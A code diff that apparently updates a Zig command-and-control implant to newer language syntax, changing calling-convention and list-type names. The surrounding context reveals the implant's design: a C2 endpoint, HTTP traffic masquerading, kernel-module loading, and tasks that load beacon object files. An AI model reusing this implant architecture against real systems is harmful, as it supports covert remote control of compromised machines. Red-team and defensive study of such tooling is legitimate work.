@@ -61,7 +61,7 @@ const netConnectionType = enum(u8) {
     TaskResult,
 };
 
-fn netInit(allocator: *anyopaque) callconv(.C) *anyopaque {
+fn netInit(allocator: *anyopaque) callconv(.c) *anyopaque {
     const alloc: *std.mem.Allocator = @ptrCast(@alignCast(allocator));
 
     return netHttpInit(alloc.*) catch unreachable;
@@ -91,7 +91,7 @@ fn netHttpInit(allocator: std.mem.Allocator) !*std.http.Client {
     return @ptrCast(http_client);
 }
 
-fn netConnect(state: *anyopaque, connectionType: netConnectionType, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque {
+fn netConnect(state: *anyopaque, connectionType: netConnectionType, extra_data: ?*anyopaque) callconv(.c) ?*anyopaque {
     const s: *State = @ptrCast(@alignCast(state));
 
     const res = netHttpConnect(s, connectionType, extra_data) catch |err| switch (err) {
@@ -133,7 +133,7 @@ fn netHttpConnect(s: *State, connectionType: netConnectionType, extra_data: ?*an
     return conn;
 }
 
-fn netDisconnect(state: *anyopaque, net_connection: *anyopaque) callconv(.C) void {
+fn netDisconnect(state: *anyopaque, net_connection: *anyopaque) callconv(.c) void {
     //const s: *State = @ptrCast(@alignCast(state));
     //const conn: *std.http.Client.Connection = @ptrCast(@alignCast(net_connection));
     //
@@ -145,7 +145,7 @@ fn netDisconnect(state: *anyopaque, net_connection: *anyopaque) callconv(.C) voi
     //conn.close(s.allocator);
 }
 
-fn netExchange(state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque {
+fn netExchange(state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.c) ?*anyopaque {
     const s: *State = @ptrCast(@alignCast(state));
     const conn: *std.http.Client.Connection = @ptrCast(@alignCast(net_connection));
 
@@ -279,7 +279,7 @@ fn netHttpExchange(s: *State, connectionType: netConnectionType, conn: *std.http
     } else return null;
 }
 
-fn netMasquerade(state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
+fn netMasquerade(state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque {
     const s: *State = @ptrCast(@alignCast(state));
     const http_reqOptions: *std.http.Client.RequestOptions = @ptrCast(@alignCast(hdr_to_mask));
 
@@ -350,7 +350,7 @@ fn netHttpMasquerade(s: *State, connectionType: netConnectionType, http_reqOptio
     return null;
 }
 
-fn netUnmasquerade(state: *anyopaque, connectionType: netConnectionType, pkt_data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque {
+fn netUnmasquerade(state: *anyopaque, connectionType: netConnectionType, pkt_data: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque {
     const s: *State = @ptrCast(@alignCast(state));
 
     const res = netHttpUnmasquerade(s, connectionType, pkt_data, len) catch |err| switch (err) {
@@ -397,7 +397,7 @@ const State = struct {
     c2_endpoint: [:0]const u8,
     assets_host: [:0]const u8,
 
-    pending_bofs: std.ArrayList(PendingBof),
+    pending_bofs: std.array_list.Managed(PendingBof),
     persistent_bofs: std.AutoHashMap(u64, bof.Object),
 
     base64_decoder: std.base64.Base64Decoder,
@@ -454,7 +454,7 @@ const State = struct {
             .base64_decoder = base64_decoder,
             .base64_encoder = base64_encoder,
 
-            .pending_bofs = std.ArrayList(PendingBof).init(allocator),
+            .pending_bofs = std.array_list.Managed(PendingBof).init(allocator),
             .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
         };
     }
@@ -475,18 +475,18 @@ const State = struct {
 const ImplantActions = struct {
     const Self = @This();
 
-    netInit: *const fn (state: *anyopaque) callconv(.C) *anyopaque = undefined,
+    netInit: *const fn (state: *anyopaque) callconv(.c) *anyopaque = undefined,
 
-    netConnect: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque) callconv(.C) ?*anyopaque = undefined,
-    netDisconnect: *const fn (state: *anyopaque, conn: *anyopaque) callconv(.C) void = undefined,
+    netConnect: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque) callconv(.c) ?*anyopaque = undefined,
+    netDisconnect: *const fn (state: *anyopaque, conn: *anyopaque) callconv(.c) void = undefined,
 
-    netExchange: *const fn (state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.C) ?*anyopaque = undefined,
+    netExchange: *const fn (state: *anyopaque, connectionType: netConnectionType, net_connection: *anyopaque, len: *u32, extra_data: ?*anyopaque) callconv(.c) ?*anyopaque = undefined,
 
-    netUnmasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
-    netMasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.C) ?*anyopaque = undefined,
+    netUnmasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, data: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque = undefined,
+    netMasquerade: *const fn (state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque = undefined,
 
-    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.C) c_int = null,
-    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.C) c_int = null,
+    kmodLoad: ?*const fn (module_image: [*]const u8, len: usize, param_values: [*:0]const u8) callconv(.c) c_int = null,
+    kmodRemove: ?*const fn (mod_name: [*:0]const u8, flags: u32) callconv(.c) c_int = null,
 
     pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
         const fields = @typeInfo(Self).@"struct".fields;
@@ -667,7 +667,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, task_fields:
 }
 
 fn processCommands(allocator: std.mem.Allocator, state: *State, resp_content: []u8) !void {
-    var task_fields = std.ArrayList([]const u8).init(allocator);
+    var task_fields = std.array_list.Managed([]const u8).init(allocator);
     defer task_fields.deinit();
 
     // handle task from C2, valid task's format:
@@ -849,7 +849,7 @@ fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
     }
 }
 
-pub export fn go(_: ?[*]u8, _: i32) callconv(.C) u8 {
+pub export fn go(_: ?[*]u8, _: i32) callconv(.c) u8 {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
